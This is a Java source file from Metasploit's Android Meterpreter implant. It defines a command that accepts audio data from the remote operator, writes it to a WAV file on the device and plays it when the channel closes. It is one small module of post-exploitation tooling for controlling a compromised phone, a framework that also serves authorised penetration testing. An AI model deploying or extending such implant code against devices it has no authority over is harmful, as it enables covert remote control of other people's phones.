package com.metasploit.meterpreter.android;

import android.media.MediaPlayer;
import com.metasploit.meterpreter.*;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.command.NotYetImplementedCommand;
import com.metasploit.meterpreter.stdapi.Loader;

import java.io.*;

public class channel_create_audio_output implements Command {

    static String fpath = Loader.expand("wav").getPath();

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Channel channel = new AudioChannel(meterpreter);
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }

    static class AudioChannel extends Channel {
        public AudioChannel(Meterpreter meterpreter) throws FileNotFoundException {
            super(meterpreter, new ByteArrayInputStream(new byte[0]), new FileOutputStream(fpath, false));
        }

        @Override
        public synchronized void close() throws IOException {
            super.close();

            MediaPlayer mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(fpath);
            mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                @Override
                public void onCompletion(MediaPlayer mediaPlayer) {
                    mediaPlayer.release();
                }
            });
            mediaPlayer.prepare();
            mediaPlayer.start();
        }
    }
}
